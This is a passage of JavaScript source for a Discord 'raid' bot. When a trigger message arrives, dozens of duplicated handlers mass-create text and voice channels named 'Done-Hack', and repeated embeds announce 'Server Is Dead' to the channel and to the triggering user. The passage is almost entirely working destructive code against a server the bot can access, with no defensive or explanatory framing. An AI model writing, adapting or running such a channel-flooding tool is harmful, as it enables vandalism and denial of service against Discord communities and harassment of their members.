  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});

//هنا الرسايل تم تهكيرك وكذا

client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
